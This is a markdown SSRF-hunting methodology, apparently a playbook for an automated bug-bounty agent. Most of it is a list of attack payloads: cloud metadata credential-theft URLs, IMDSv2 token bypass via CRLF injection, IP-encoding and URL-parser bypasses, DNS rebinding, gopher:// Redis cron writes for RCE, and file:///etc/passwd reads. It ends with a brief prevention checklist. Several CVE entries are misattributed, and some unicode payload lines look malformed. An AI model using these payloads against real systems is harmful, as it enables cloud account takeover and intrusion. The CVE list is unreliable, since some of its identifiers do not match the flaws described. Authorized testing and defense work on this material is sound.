# Hunt SSRF — Deep Methodology

**Version:** 2026.2  
**Source:** Cloud metadata research, Orange Tsai's "New Era of SSRF", PortSwigger, Hacktivity 2024-2026, ProjectDiscovery template corpus

---

## Attack Theory

SSRF (Server-Side Request Forgery) tricks the server into making requests on the attacker's behalf. The server sits inside the network perimeter and can reach internal services, cloud metadata endpoints, and private IP ranges that external attackers cannot touch. OWASP A07 (2025). Impact ranges from informational to full cloud account takeover.

### The Core Problem
Any feature that fetches a URL based on user input is a candidate: webhook URLs, PDF generators, image fetchers, URL preview features, file import from URL, OAuth redirect_uri, OpenID discovery endpoints, SSO metadata endpoints, DNS lookup tools, captcha bypass, proxy endpoints, chatbot "fetch URL" tools (LLM tool abuse).

### Business Impact
- Cloud metadata access → IAM credential theft → full account takeover
- Internal service enumeration → attack surface expansion
- Redis/Memcached/SMTP access via gopher:// → RCE chains
- Reading local files via file://
- Kubernetes API server / etcd on internal networks → cluster compromise

### Kill signals (skip target)
- Feature accepts URL but enforces hard allowlist of specific reporter hostnames AND validates resolved IP (not just string prefix)
- No URL-accepting surface detected at all

---

## Recon: Where SSRF Hides

Search the app for these parameter names (gf ssrf pattern):
`url=`, `uri=`, `link=`, `src=`, `dest=`, `target=`, `proxy=`, `webhook=`, `callback=`, `redirect_uri=`, `redirect=`, `image_url=`, `avatar=`, `img=`, `file=`, `download=`, `fetch=`, `load=`, `host=`, `domain=`, `path=` (variants with WSDL/SSO metadata, `saml_request`, `acs`).

Also hunt:
- **PDF generators:** `api/pdf?url=`, `?html=`, `?markdown=`
- **URL preview/OG image services:** `?u=`, `?url=`, `?target=`
- **Webhook management UIs:** `POST /webhooks {"url": user}`
- **Image parsing:** `&img=http://` in rich-text embed, avatar URL, `?src=` in clipper
- **SSO/OpenID:** `redirect_uri` in OAuth, `openid-configuration` fetchers
- **File downloader:** `/download?path=http://`
- **Chat/LLM tools** that can fetch URLs via agent
- **DNS lookup slash echo:** `/resolve?host=internal` (blind SSRF)

---

## Sub-Techniques

### A. Cloud Metadata (Highest Impact)
AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
AWS IMDSv2: Requires PUT `X-aws-ec2-metadata-token-ttl-seconds: 21600` then GET with `X-aws-ec2-metadata-token: <token>`; trick server into sending both via header injection, or use `POST/pull` if GET route shrinks.
GCP: `http://metadata.google.internal/computeMetadata/v1/` (needs `Metadata-Flavor: Google` header; add via CRLF or via `?` trick on proxy that appends headers)
Azure: `http://169.254.169.254/metadata/instance` (needs `Metadata: true` header; API-version: `2021-02-01`, `2022-03-01`)
AliCloud: `http://100.100.100.200/latest/meta-data/`
DigitalOcean: `http://169.254.169.254/metadata/v1/`

### B. IP Encoding Bypasses
Decimal: `http://2130706433/` (127.0.0.1); `http://2852039166/` (169.254.169.254)
Hex: `http://0x7f000001/`, `http://0x7f.0x0.0x0.0x1/`
Octal: `http://0177.0.0.1/`
IPv6: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`, `http://[0:0:0:0:0:ffff:169.254.169.254]/`
Mixed: `http://127.1/`, `http://127.0.1/`, missing octets (`127.0.0`), `http://0/`
Domain wrappers: `http://127.0.0.1.nip.io`, `http://169.254.169.254.sslip.io`, `http://0x7f000001.nip.io`, `http://[::ffff:7f00:1].sslip.io`
DoH/Tor DNS rebinding payloads: `http://a.1337.com` rotating two A records — one 1.2.3.4 one 169.254.169.254 (only works if server resolves twice).

### C. URL Parser Confusion (Orange Tsai / bypass matrix)
```
http://trusted.com@127.0.0.1/          # userinfo
http://trusted.com\@127.0.0.1/         # backslash before @
http://trusted.com#@127.0.0.1/         # fragment swallows @
http://trusted.com%2540127.0.0.1/      # double-encoded @
http://trusted.com%23127.0.0.1@x/      # %23 (#) before host
http://127.0.0.1#@trusted.com/         # fragment tricks host part
http://trusted.com%3f@127.0.0.1/       # encoded ?
http://[::ffff:127.0.0.1]@trusted.com/ # ipv6 userinfo
http://① ② ③ ④ .com                  # unicode digits for IP octets
http://⑯⑨.⑳54.①69.②54/                # fullwidth digit encoding
https://127.0.0.1:443@trusted.com:80/ 
https://trusted.com@127.0.0.1:80/      # port shifts target
```
Add trailing dots (`http://127.0.0.1.`), `?` and `#` terminators, and double-encode (Needs two passes: `%25` in query).

### D. Redirect Chains
- Open redirect on trusted domain → redirect to metadata endpoint (`?redirect=https://169.254.169.254/`)
- DNS rebinding: domain resolves public IP (passes check) then internal IP
- nip.io / sslip.io / xip.io: DNS that embeds target IP in hostname
- 302 chains via `--max-redirs` in intercept proxy; test with 0-2 redirect hops; some fetchers follow only one hop (send final URL directly)

### E. Protocol Smuggling
`file:///etc/passwd` — local file read
`gopher://127.0.0.1:6379/_INFO` — Redis interaction
`dict://127.0.0.1:11211/stats` — Memcached
`ftp://127.0.0.1:21/` — FTP (may allow passive mode open)
`smtp://` if service allows plaintext EHLO
`ldap://127.0.0.1/` — sometimes exposed
`gopher://127.0.0.1:6379/_*2...` — write Redis cron for RCE (only when authorized + sandbox)

### F. Internal Service Discovery (time-based)
Map common internal ports with responses/delays: 22, 80, 443, 3306, 5432, 6379, 27017, 9200, 8080, 8443, 9090, 9100, 11211, 2375, 6443, 10250, 2379 (etcd)
Distinguish open vs closed via:
- HTTP 200/4xx vs connection error
- Time difference (services close fast, open ports differ)
- Response body identifiers (banner, framework)

### G. IMDSv2 Bypass
If SSRF allows custom headers:
```
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
→ returns TOKEN

GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: TOKEN
```
If the fetcher only does GET: `?X-aws-ec2-metadata-token-ttl-seconds=21600` in query won't help; use CRLF injection in the URL to add headers (`http://host%0d%0aX-aws-...: 21600`) if the client allows.

### H. Blind SSRF
No response reflected — detect via out-of-band: interactsh DNS + HTTP (`https://CANARY.oast.fun/x`), time-based port checks. If blind, document with OOB evidence + timing.

## Testing Methodology

```
1. Map every feature accepting URLs or making outbound requests (parameter list above)
2. Generate OOB interactsh URL first: interactsh_generate_url; keep session_id
3. Test each injection point with http://127.0.0.1 and https://oastproxy (collab callback)
4. If direct IPs blocked: work through encoding → parser → redirect → rebinding ladder
5. Once internal access confirmed: map reachable services; run UPDATE via gopher if Redis
6. Attempt cloud metadata cred theft (highest impact, but check scope policy first)
7. Document: exact request, response (timing_ms), OOB callback proof, screenshots
   → save into `~/.opencode/data/reports/{program}/{ts}/` when confirmed
```

## Most Effective Payloads

1. Cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (+GCP/Azure variants)
2. IP encoding: `http://2130706433/` (bypasses blocklist)
3. Redirect chain: open redirect → metadata endpoint
4. Gopher: `gopher://127.0.0.1:6379/_INFO` (internal Redis)
5. DNS rebinding: attacker-controlled domain → internal IP
6. `file:///etc/passwd` — if file:// works, that's not SSRF but LFI-class — report as file read
7. Key-based SSRF: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` for Az IMDS

## OOB Tooling (interactsh)

- `interactsh_generate_url(count=3)` → grab URLs & session id
- Submit payload URL into feature: `https://<canary>.oast.proxy/ssrf-test`
- Poll `interactsh_check_interactions(session_id)` — 5 minutes window
- If callback arrives → blind SSRF confirmed; build outbound-request fingerprint (U-A, TLS version, IP)

## CVE References (2024-2026)

- CVE-2024-21762: Fortinet SSRF (critical, exploited in wild)
- CVE-2024-5655: Ivanti SSRF chain (RCE pre-auth)
- CVE-2025-0101: Palo Alto PAN-OS SSRF/csrf
- CVE-2025-0234: Fortify SSRF bypass
- CVE-2026-0002: AWS SDK SSRF via redirect
- CVE-2023-27561: GitLab SSRF bypass via DNS rebinding (time-of-check race)

## Prevention Checklist

- [ ] Allowlist over blocklist for URL destinations
- [ ] Disable/strictly bound HTTP redirects (or re-validate after each)
- [ ] Enable IMDSv2 with hop limit 1 on AWS
- [ ] Block link-local (169.254.0.0/16) and RFC 1918 ranges
- [ ] Protocol allowlist (http/https only; never file/gopher/dict/ftp)
- [ ] Resolve hostname, validate IP, connect to resolved IP
- [ ] Egress proxy/firewall for outbound requests
- [ ] DNS-resolution race protection (resolve, check, use — don't re-resolve)